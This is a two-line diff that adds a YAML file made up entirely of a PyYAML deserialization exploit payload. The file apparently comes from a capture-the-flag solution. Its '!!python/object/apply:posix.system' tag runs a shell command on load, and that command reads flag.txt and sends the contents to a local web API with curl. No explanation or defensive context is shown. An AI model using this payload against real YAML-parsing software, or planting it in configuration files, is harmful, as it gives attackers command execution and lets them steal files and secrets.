@@ -1,0 +1,2 @@
+!!python/object/apply:posix.system ['curl http://localhost:5000/api/values?data=`cat
+    flag.txt `']
